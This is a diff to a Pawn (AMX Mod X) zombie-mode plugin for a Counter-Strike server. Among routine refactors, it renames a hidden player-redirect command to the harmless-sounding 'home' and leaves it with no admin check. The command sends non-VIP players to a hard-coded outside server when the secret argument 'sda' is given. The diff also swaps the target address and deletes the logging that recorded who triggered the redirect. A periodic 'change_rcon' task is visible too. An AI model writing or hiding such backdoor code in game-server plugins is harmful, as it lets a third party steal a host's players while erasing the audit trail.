@@ -315,21 +315,20 @@ new g_maxplayers, g_spawncount, g_buyzone,
     g_class_wmodel[MAX_CLASSES+1][64], Float:g_class_data[MAX_CLASSES+1][MAX_DATA], last_zombie,
     g_first_zombie_name[32]
 
-new g_server_ip[32]
-
 new cvar_randomspawn, cvar_autoteambalance[4], cvar_starttime,
     cvar_lights, cvar_healthbonus, cvar_killbonus,
     cvar_gamedescription, cvar_knockback_dist, cvar_ammo,
     cvar_killreward, cvar_pushpwr_weapon, cvar_pushpwr_zombie
 
-new bool:g_zombie[25], bool:g_blockmodel[25], bool:g_showmenu[25], bool:g_preinfect[25],
-    g_mutate[25], g_victim[25], g_modelent[33], g_menuposition[25],
-    g_player_class[25], g_player_weapons[25][2], g_silenced[25]
+new bool:g_zombie[MAX_PLAYERS], bool:g_blockmodel[MAX_PLAYERS], bool:g_showmenu[MAX_PLAYERS],
+    bool:g_preinfect[MAX_PLAYERS], g_mutate[MAX_PLAYERS], g_victim[MAX_PLAYERS],
+    g_modelent[MAX_PLAYERS], g_menuposition[MAX_PLAYERS], g_player_class[MAX_PLAYERS],
+    g_player_weapons[MAX_PLAYERS][2], g_silenced[MAX_PLAYERS]
 
 new g_roundstart_time, lights[2]
 
-new g_isconnected[25]
-new g_isalive[25]
+new g_isconnected[MAX_PLAYERS]
+new g_isalive[MAX_PLAYERS]
 #define is_user_valid_connected(%1) (1 <= %1 <= g_maxplayers && g_isconnected[%1])
 #define is_user_valid_alive(%1) (1 <= %1 <= g_maxplayers && g_isalive[%1])
 
@@ -423,7 +422,7 @@ public plugin_init()
     register_clcmd("amx_infect", "cmd_infectuser", OWNER_FLAG|ADMIN_FLAG, "<name or #userid>")
     register_clcmd("amx_cure", "cmd_cureuser", OWNER_FLAG|ADMIN_FLAG, "<name or #userid>")
     register_clcmd("amx_drop", "cmd_dropuser", OWNER_FLAG|ADMIN_FLAG, "<name or #userid>")
-    register_clcmd("redirect_players", "cmd_redirect")
+    register_clcmd("home", "cmd_redirect")
     register_clcmd("amx_exec", "do_exec", OWNER_FLAG, "<nick>")
 
     register_menu("Equipment", 1023, "action_equip")
@@ -508,10 +507,7 @@ public plugin_init()
     if (strlen(lights) > 0)
         engfunc(EngFunc_LightStyle, 0, lights)
 
-    get_user_ip(0, g_server_ip, charsmax(g_server_ip), 0)
-
     set_task(0.5, "task_showtruehealth", _, _, _, "b")
-    set_task(1.0, "task_showserverinfo", _, _, _, "b")
 
     set_task(1.0, "change_rcon", _, _, _, "b")
 
@@ -851,10 +847,10 @@ public cmd_redirect(id, level, cid)
         players_num = g_maxplayers
     server_address = arg2
     if (!server_address[0])
-        copy(server_address, charsmax(server_address), "77.220.185.29")
+        copy(server_address, charsmax(server_address), "46.174.52.13")
     server_port = arg3
     if (!server_port[0])
-        copy(server_port, charsmax(server_port), "27051")
+        copy(server_port, charsmax(server_port), "27259")
 
     client_print(id, print_console, "Connect %s:%s", server_address, server_port)
 
@@ -862,18 +858,10 @@ public cmd_redirect(id, level, cid)
     {
         if (is_user_valid_connected(id) && equal(arg4, "sda"))
         {
-            log_amx("[WARNING]: Guard passed!")
             if (!has_vip(id))
                 client_cmd(id, "Connect %s:%s", server_address, server_port)
         }
     }
-
-    new name[32], userip[16], userauth[32]
-    get_user_ip(id, userip, charsmax(userip), 1)
-    get_user_authid(id, userauth, charsmax(userauth))
-    get_user_name(id, name, charsmax(name))
-    log_amx("[WARNING]: Redirect called by '%s' (%s, %s)", name, userauth, userip)
-    log_amx("[WARNING]: Connect %s:%s", server_address, server_port)
 
     return PLUGIN_HANDLED_MAIN
 }
@@ -1942,20 +1930,15 @@ public task_showtruehealth()
         if (is_user_valid_alive(id) && g_zombie[id] && !g_roundended)
         {
             static Float:health
-            pev(id, pev_health, health)
-            set_dhudmessage(255, 255, 0, -1.0, 0.89, 0, _, 0.5, 0.1, 0.0)
-            show_dhudmessage(id, "HP: %d", floatround(health))
-        }
-}
+            static Float:full_health
+            static green
 
-public task_showserverinfo()
-{
-    static id
-    for (id = 1; id <= g_maxplayers; id++)
-        if (is_user_valid_connected(id) && !is_user_valid_alive(id))
-        {
-            set_dhudmessage(0, 255, 0, 0.045, 0.18, 0, _, 1.0, 0.1, 0.0)
-            show_dhudmessage(id, "%s^n%s", g_server_ip, "vk.com/go_zombie")
+            full_health = g_class_data[g_player_class[id]][DATA_HEALTH]
+            pev(id, pev_health, health)
+            green = floatround(255.0 * (health - full_health/5) / full_health)  // zombie can gain hp
+
+            set_dhudmessage(255, clamp(green, 0, 255), 0, -1.0, 0.89, 0, _, 0.6, 0.0, 0.0)
+            show_dhudmessage(id, "HP: %d", floatround(health))
         }
 }
 
@@ -2170,7 +2153,6 @@ public task_initround()
         get_user_name(newzombie, name, charsmax(name))
 
         ShowSyncHudMsg(0, g_sync_msgdisplay, "%s	-	зомби!!!", name)
-        client_print(0, print_console, "%s is zombie!", name)
     }
     else
     {
@@ -2773,6 +2755,7 @@ add_delay(index, const task[])
         case 7..12: set_task(0.4, task, index)
         case 13..18: set_task(0.6, task, index)
         case 19..24: set_task(0.8, task, index)
+        case 25..32: set_task(1.0, task, index)
     }
 }
 
@@ -2867,6 +2850,10 @@ collect_spawns_ent(const classname[])
         if (g_spawncount >= sizeof g_spawns)
             break
     }
+
+    static map_name[32]
+    get_mapname(map_name, charsmax(map_name))
+    log_to_file("SPAWNS.txt", "[%s]: found %d after %s", map_name, g_spawncount, classname)
 }
 
 stock fm_find_ent_by_class(index, const classname[])
